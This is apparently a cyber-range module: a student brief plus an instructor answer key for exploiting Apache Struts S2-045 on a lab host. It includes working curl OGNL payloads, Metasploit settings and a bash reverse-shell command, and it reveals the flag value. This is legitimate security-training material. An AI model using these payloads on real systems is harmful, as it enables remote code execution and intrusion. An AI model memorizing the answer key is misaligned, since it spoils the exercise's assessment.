# Chicago Student Brief

## General Instructions

On this subnet, `.254` is the lab router and is out of bounds.

The following docker containers are available to you as pre-installed tools helpful for the labs. Additional details are in the README.txt file on the Kali desktop.

- JavaChains

## Assigned Subnet

`192.168.10.0/24`

## Objective

From your assigned operations station, discover the host on the assigned subnet, gain appropriate access, and collect the flag.

The flag is obvious once you reach it. It is not intentionally hidden or obfuscated.

## Deliverable

Record the flag value for Chicago.

## PCTE range limitations

These limits apply on Persistent Cyber Training Environment (PCTE) ranges used by this Module. Treat the items below as a no-strike list when they exist. Not every item is present on every range or host.

Do not target, block, terminate, or delete range-control artifacts:

- **Network:** `10.0.0.0/8` (range control and instrumentation; do not block or flag that traffic). Routers past the edge-router in grey space. TCP `5672` (AMQP user-emulation on the control subnet), `49998`, and `49999`.
- **Accounts:** `range-admin` / `range_admin`, `range-control`, and `range`. Do not use accounts whose username or password contains `simspace`.
- **User emulation:** do not stop it. Typical paths: `C:\Program Files (x86)\Simspace\` and `C:\Users\<Username>\Simspace`. Scripts: `run-actuation.cmd`, `ueactuation.cmd`.
- **Directories:** `C:\Program Files\Puppet Labs` and the Simspace paths above.
- **Processes:** `java.exe`, `javaw.exe`, `ruby.exe`, `rubyw.exe`, `start.exe`, `chromedriver.exe`, `IEDriverServer.exe`, Metova, Selenium, WebDriver.

# Chicago — Instructor Answer Key

## Objective and starting context

Students start on the assigned operations station with only the city codename and subnet `192.168.10.0/24`. They must discover the live host, gain access, and recover the flag. The live instructor walkthrough is in this file.

Do not give students the service name, CVE, or host IP.

## Flag / reference table

|Item|Value|
|---|---|
|City|Chicago|
|Assigned subnet|`192.168.10.0/24`|
|Deploy flag key|`T1_FLAG`|
|Default flag|`crimson-falcon`|
|Flag location on target|`/flag.txt` after access|

Rotate `T1_FLAG` in `environments/pcte_vulnhub_targets/.env` and restart the matching container when the class needs a new value. Grade against the live `.env` value, not only the default in this table.

## Initial situational awareness

Establish ops-station context before touching the assigned subnet. These commands are first-use literacy for this Module: run the full set, then interpret.

```
date -u
hostname
whoami
id
pwd
echo "$SHELL"
uname -a
cat /etc/os-release
who
w
ps aux
ss -tulpen
ss -tunap
ip a
ip -4 route
```

Why this matters:

- `date -u` and `hostname` fix remote time and host identity before any later log or packet evidence.
- `whoami`, `id`, `pwd`, and `echo "$SHELL"` lock user, session, and interpreter context.
- `uname -a` and `/etc/os-release` capture OS/runtime version.
- `who` / `w` and `ps aux` show active users and a process baseline.
- `ss -tulpen` (listeners) and `ss -tunap` (active sockets) give the required TCP+UDP picture.
- `ip -4 route` and `ip route get 192.168.10.10` show that the assigned subnet is already reachable via the default gateway.

Expected findings:

- The student is on the operations station (hostname `ops`), not on the city target. The shell is `zsh`.
- `ip -4 addr` shows the lab-facing address on `eth1` (this deployment: `172.16.123.100/24`). The `eth0` address `10.10.123.100/16` is not the path to this city subnet.
- `ip route get 192.168.10.10` uses the default gateway (this deployment: `via 172.16.123.253 dev eth1 src 172.16.123.100`). Do not add a route via `192.168.100.254`. That next hop does not answer, and a more-specific route would hide the working default path.
- Listening sockets on the ops station are local tooling, not the target. `ss` shows SSH and the local JavaChains listener on `8011/tcp`.

## Instructor live walkthrough

### Objective and starting context

Live instructor demo for the Chicago Module (`B02.M07`). Students know only the assigned subnet `192.168.10.0/24`. On this range, `.254` is the lab router on the segment and is out of bounds. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.10.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T1_FLAG`. Confirm the live `.env` value before grading.

### Required Tools

- `iproute2` (for `ip route get`. This ops station already has a path, so do not add a static route)
- `nmap` (for host discovery and port scanning)
- `curl` (for web enumeration and payload delivery)
- `nc` (Netcat, for catching the reverse shell)
- `metasploit-framework` (section 4 automated path via `exploit/multi/http/struts2_content_type_ognl`)

### 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.10.0/24`. The operations station is on `172.16.123.0/24` (`eth1`). The city subnet is reached through the default gateway.

Confirm the path before scanning. `ip route get` prints the next hop and the source address the kernel will use:

```
ip route get 192.168.10.10
```

_Output:_

```
192.168.10.10 via 172.16.123.253 dev eth1 src 172.16.123.100 uid 1000
    cache
```

**Observation:** The subnet is already reachable. The source address is `172.16.123.100`.

**Inference:** Do not run `ip route add 192.168.10.0/24 via 192.168.100.254`. `192.168.100.254` does not answer on this range, and that more-specific route would override the working default path.

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need a live host before we care about services.

```
nmap -sn -n 192.168.10.0/24
```

_Why `-n`:_ skip reverse DNS. The ops station resolver (`172.16.123.253`) refuses DNS. Without `-n`, this sweep sits at full CPU and does not print hosts. With `-n`, the same sweep finishes in a few seconds.

_Output excerpt:_

```
Nmap scan report for 192.168.10.10
Host is up.
Nmap scan report for 192.168.10.254
Host is up.
```

**Observation:** Two hosts respond on this subnet. `192.168.10.1` does not.

**Inference:** The student brief marks `.254` as the lab router and out of bounds. Concentrate service enumeration on **192.168.10.10**. The shell later confirms that address is the workload's default gateway.

### 2. Service Enumeration

We have a candidate IP. Next question: **what is listening, and what does it claim to be?** That takes a version scan, not another ping sweep.

```
nmap -Pn -sV -n -p- 192.168.10.10
```

_Why these options:_

- `-Pn` — skip nmap’s host-discovery probes. We already know `192.168.10.10` responded to `-sn`. This also keeps the scan going if the host later ignores ping but still serves TCP.
- `-n` — skip reverse DNS, same reason as the sweep. The resolver still refuses.
- `-sV` — version detection. An open port labeled only `http` is not enough to research; we need the product and version string (here, **Jetty 9.2.11**).
- `-p-` — all 65535 TCP ports, not nmap’s default top 1000. A single missed listener would hide the whole attack surface. On this host the extra cost is small.

_Output excerpt:_

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Jetty 9.2.11.v20150529
```

**Observation:** A single open port — **8080/tcp** — identified as HTTP on **Jetty 9.2.11.v20150529**.

**Inference:** This is a Java HTTP stack, but Jetty alone does not name the application framework. Next, fetch the root page and read what it claims to be. Use port **8080** in the URL because that is the only listener nmap found (not 80).

#### Initial Web Probing

nmap told us HTTP on 8080. Confirm that in the HTTP conversation: response headers (container) and the HTML (application name and forms).

```
curl -s -D - http://192.168.10.10:8080/ -o /tmp/t1-root.html | head -12
```

_Why this `curl`:_

- `-s` — silent; drop the progress meter so the output is just headers/body.
- `-D -` — write response **headers** to stdout (`-` means stdout). That is where `Server` / cookies show up.
- `-o /tmp/t1-root.html` — write the **body** to a file so we can inspect the HTML without mixing it into the header dump.
- `| head -12` — only the first header lines; we care about status and `Server`, not a long dump.

_Header excerpt:_

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=ISO-8859-1
Set-Cookie: JSESSIONID=...;Path=/
Server: Jetty(9.2.11.v20150529)
```

**Note:** In the header line `Set-Cookie:` the path is defined as `Path=/` this will be necessary to configure the exploit later

The saved HTML is a full Struts showcase page. We do not need every tag. We need **what the app calls itself** and **whether it exposes an upload form**, because those two facts decide what to research next.

```
grep -iE 'title|h1|form|enctype|action=|type="file"' /tmp/t1-root.html
```

_Why these patterns:_

- `grep -iE` — case-insensitive extended regex, so `Title` and `title` both match.
- `title` / `h1` — page identity. That is how we learn this is **Struts2 Showcase**, not a blank Jetty index.
- `form` / `enctype` / `action=` — how the page sends data, and to which path.
- `type="file"` — a file input means this is an **upload** demo, not a login box.

We are not hunting a random string. Those fields are the usual “what is this web app?” cuts on an HTML form page.

_Body excerpt:_

```
<title>Struts2 Showcase - Fileupload sample</title>
<h1>Fileupload sample</h1>
<form id="doUpload" name="doUpload" action="/doUpload.action;jsessionid=..." method="POST" enctype="multipart/form-data">
<input type="file" name="upload" value="" id="doUpload_upload"/>
<input type="text" name="caption" value="" id="doUpload_caption"/>
```

**Observation:** The page title names **Struts2 Showcase** and a **Fileupload sample**. The form posts to `/doUpload.action` with `enctype="multipart/form-data"` and a file input.

**Inference:** This is an Apache Struts 2 demo focused on file upload, not a generic Jetty index. Searching with only those page facts — `Struts2 Showcase Fileupload sample` — lands on the Struts showcase / file-upload documentation ([File Upload](https://struts.apache.org/core-developers/file-upload)). Struts file upload depends on parsing `multipart/form-data`, which starts from the request's `Content-Type` header (including its boundary).

**Candidate selection:** Struts2 has had many unrelated RCE classes (parameter OGNL, REST plugin, etc.). This page is built to exercise **upload**, so the multipart / `Content-Type` parsing path is the first surface to test — before unrelated Struts bugs that this demo does not advertise.

### 3. Vulnerability Discovery

We now know:

- The product is **Apache Struts 2** (showcase upload demo)
- The interesting surface is **multipart file upload** (`enctype="multipart/form-data"`, `/doUpload.action`)
- The container is **Jetty** on port **8080**

Searching from those facts — `struts2 multipart Content-Type OGNL` or `struts2 jakarta multipart parser RCE` — surfaces the Jakarta Multipart parser flaw **S2-045** / **CVE-2017-5638** ([S2-045](https://struts.apache.org/docs/s2-045.html)).

**What the bug is:** Struts uses **OGNL** (Object-Graph Navigation Language) as an expression language inside the framework. When a request looks like a multipart upload, the **Jakarta multipart parser** reads the `Content-Type` header. In vulnerable versions, a malformed `Content-Type` is evaluated as OGNL during error handling. You do **not** need to POST a file. A crafted `Content-Type` on an ordinary request to `/` is enough to hit the parser.

That is the research result. Next we **prove** this host evaluates OGNL that way, using a public detection payload — not a reverse shell yet.

#### Detection probe (public S2-045 check)

The long `Content-Type` line is **not** something we invented for this lab. It is the standard S2-045 _detection_ PoC used in the Vulhub environment (`vulnhub/struts2/s2-045/README.md`) and in public write-ups: OGNL in `Content-Type` that calls `HttpServletResponse.addHeader(...)` with the canary expression `233*233`, then a suffix that still looks like multipart (`...}.multipart/form-data`).

What each piece is doing:

- `%{ ... }` — Struts OGNL wrapper; the parser is tricked into evaluating the string.
- `addHeader('X-Vuln-Check', 233*233)` — run the math, put the result in an HTTP **response** header. `233*233 = 54289` is a canary so a hit is obvious.
- **`X-Vuln-Check`** — a **name we chose** for that response header so we can spot it. The public PoCs use the same `addHeader` trick with various names (`X-Test-...`, `X-Cmd-Response`, and so on). The name is arbitrary; the math in the header value is what proves evaluation.
- `.multipart/form-data` on the end — keeps `Content-Type` looking like a multipart upload so the Jakarta parser actually handles it.

`curl -I` sends a **HEAD** request and prints response headers only. The canary lives in a header, so we do not need the HTML body.

Same contrast as a closed vs open switch: send the OGNL **without** the multipart suffix first. The parser should ignore it.

```
curl -s -I "http://192.168.10.10:8080/" \
  -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Vuln-Check',233*233)}"
```

_Output excerpt:_

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=ISO-8859-1
Server: Jetty(9.2.11.v20150529)
```

**Observation:** No `X-Vuln-Check` header.

**Inference:** OGNL in `Content-Type` alone is not enough. The value still has to look like multipart.

Now the public PoC shape — same OGNL, with the `.multipart/form-data` suffix:

```
curl -s -I "http://192.168.10.10:8080/" \
  -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Vuln-Check',233*233)}.multipart/form-data"
```

_Output excerpt:_

```
HTTP/1.1 200 OK
X-Vuln-Check: 54289
Server: Jetty(9.2.11.v20150529)
```

**Observation:** The response includes `X-Vuln-Check: 54289` — exactly `233*233`.

**Inference:** The server **evaluated** our OGNL and wrote the result into the header we named. That is expression execution on the S2-045 path. A shell is the same channel with a larger OGNL payload (section 5) or Metasploit (section 4).

### 4. Automated Path: Metasploit

Product + confirmed `Content-Type` OGNL evaluation is enough to look for an existing exploit. In `msfconsole`:

```
msf6 > search cve:2017-5638

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/multi/http/struts2_content_type_ognl  2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection
```

(The same module is findable with `search struts2_content_type`.)

The module defaults to `TARGETURI=/struts2-showcase/`. This lab serves the showcase at **`/`**, so a check with the default path does not reliably confirm the target:

```
msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 exploit(multi/http/struts2_content_type_ognl) > set RHOSTS 192.168.10.10
msf6 exploit(multi/http/struts2_content_type_ognl) > set RPORT 8080
msf6 exploit(multi/http/struts2_content_type_ognl) > set PAYLOAD cmd/unix/reverse_bash
msf6 exploit(multi/http/struts2_content_type_ognl) > set LHOST 172.16.123.100
msf6 exploit(multi/http/struts2_content_type_ognl) > set LPORT 4444
msf6 exploit(multi/http/struts2_content_type_ognl) > check
[*] 192.168.10.10:8080 - Cannot reliably check exploitability.
```

_What we learned:_ Match `TARGETURI` to the path we already saw in the HTML (`/` and `/doUpload.action`), not the module's showcase default.

Working options:

```
msfconsole -q
```

```
msf6 > use exploit/multi/http/struts2_content_type_ognl
msf6 exploit(multi/http/struts2_content_type_ognl) > set RHOSTS 192.168.10.10
msf6 exploit(multi/http/struts2_content_type_ognl) > set RPORT 8080
msf6 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI /
msf6 exploit(multi/http/struts2_content_type_ognl) > set LHOST 172.16.123.100
msf6 exploit(multi/http/struts2_content_type_ognl) > set LPORT 4444
msf6 exploit(multi/http/struts2_content_type_ognl) > set PAYLOAD cmd/unix/reverse_bash
msf6 exploit(multi/http/struts2_content_type_ognl) > check
[+] 192.168.10.10:8080 - The target is vulnerable.
msf6 exploit(multi/http/struts2_content_type_ognl) > run
```

`LHOST` is the `src` address from `ip route get 192.168.10.10`. Do not use `192.168.100.1`. That address is not on this station.

_Output excerpt:_

```
[*] Started reverse TCP handler on 172.16.123.100:4444
[*] Command shell session 1 opened (172.16.123.100:4444 -> 192.168.10.10:34730)
```

The source port changes across runs.

In the session:

```
id
date -u
hostname
whoami
ip a
ip r
pwd
echo "$SHELL"
ps aux
uname -a
cat /etc/os-release
who
w
ss -tulpen
ss -tunap
```

Expected findings on this image:

- `id` is `uid=0(root)`. `whoami` is `root`. `hostname` is the container id (this run: `c1d7c40a33b2`). It changes when the container is recreated.
- `ip r` shows `default via 192.168.10.254`. `pwd` is `/usr/src`.
- `echo "$SHELL"` prints an empty value. `/etc/os-release` is Debian 9 (stretch). `uname -a` reports the range host kernel.
- `ps`, `w`, `who`, and `ss` are installed. `netstat` is not.

Find the flag. Quote the pattern so the ops station's `zsh` does not expand it before the command reaches the target:

```
find / -iname '*flag*' 2>/dev/null
cat /flag.txt
```

The broad name match also hits kernel paths that contain `flags`. The proof file is `/flag.txt`.

_Output of `cat /flag.txt`:_

```
crimson-falcon
```

That is a complete automated path to the flag. Section 5 is the same bug without Metasploit.

### 5. Manual Path: Content-Type OGNL reverse shell

The matching Vulhub environment (`vulnhub/struts2/s2-045/README.md`) uses the same header-math check we already ran (`233*233` → `54289`). With detection confirmed, escalate to an OS callback.

Start a Netcat listener on the operations station. `LHOST` below is the `src` address from `ip route get 192.168.10.10`:

```
nc -lvnp 4444
```

It is tempting to reuse the short detection pattern with `Runtime.exec`:

```
curl -s -I "http://192.168.10.10:8080/" \
  -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('Result',@java.lang.Runtime@getRuntime().exec('id'))}.multipart/form-data"
```

_Output excerpt:_

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Server: Jetty(9.2.11.v20150529)
```

No useful `Result` header, and no command output.

_What we learned:_ Struts2's OGNL security manager (`SecurityMemberAccess`) blocks direct use of dangerous classes such as `java.lang.Runtime`. A longer public S2-045 payload is required: clear excluded packages/classes, restore default member access, then run the command via `ProcessBuilder`.

The following `PAYLOAD` is a standard public CVE-2017-5638 / S2-045 vector (Exploit-DB / common GitHub PoCs; Vulhub documents the same class of `Content-Type` OGNL abuse in `vulnhub/struts2/s2-045/README.md`). High-level stages:

1. Force the multipart parser path (`#nike='multipart/form-data'`).
2. Obtain default member access and clear OGNL exclusion lists via `OgnlUtil`.
3. Build a `ProcessBuilder` for `/bin/bash -c` with the reverse shell command.
4. Copy process streams to the HTTP response (the reverse shell still connects out to our listener).

```
LHOST="172.16.123.100"   # src from: ip route get 192.168.10.10
LPORT="4444"
REVCMD="bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"

PAYLOAD="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\"$REVCMD\").(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

curl -s "http://192.168.10.10:8080/" -H "Content-Type: $PAYLOAD"
```

Check the Netcat listener for a root shell:

```
listening on [any] 4444 ...
connect to [172.16.123.100] from (UNKNOWN) [192.168.10.10] 34730
root@c1d7c40a33b2:/usr/src#
```

The source port and the container id in the prompt change across runs. The peer address is the city host. The same `PAYLOAD` with a command such as `cat /flag.txt` in `REVCMD` prints that command's output in the HTTP body.

From the reverse shell (or the Metasploit session in section 4):

```
cat /flag.txt
```

_Output:_

```
crimson-falcon
```

Target 1 is complete.

## Troubleshooting / confirmation

- If the subnet does not respond, confirm the stack is up and `ip route get 192.168.10.10` still uses the default gateway. Do not add a route via `192.168.100.254`.
- If `nmap -sn` never prints hosts, rerun it with `-n`.
- If the session does not connect, set `LHOST` to the `src` address from `ip route get 192.168.10.10`, not `192.168.100.1`. Confirm `TARGETURI` is `/`.
- If the recovered string does not match this table, read the live `T1_FLAG` from `.env` before marking the quiz wrong.
- If students name a CVE or product before they have service evidence, redirect them to host discovery and version output.
- The city subnet for this module is `192.168.10.0/24`. The ops-station address can change with DHCP; take `LHOST` from `ip route get`, not from a remembered `172.16.123.100`.

## Grading checkpoints

|Checkpoint|Acceptable evidence|
|---|---|
|Assigned subnet used|Student worked `192.168.10.0/24` (or the live remapped equivalent)|
|Host discovered|Live host identified from a subnet sweep, not from a handed IP|
|Access gained|Command or session evidence that reached the target filesystem|
|Flag submitted|Quiz value matches live `T1_FLAG` (default `crimson-falcon`)|

Accept a correct live flag even if the student used a valid alternate exploit path. Do not award the quiz for a walkthrough dump without the flag.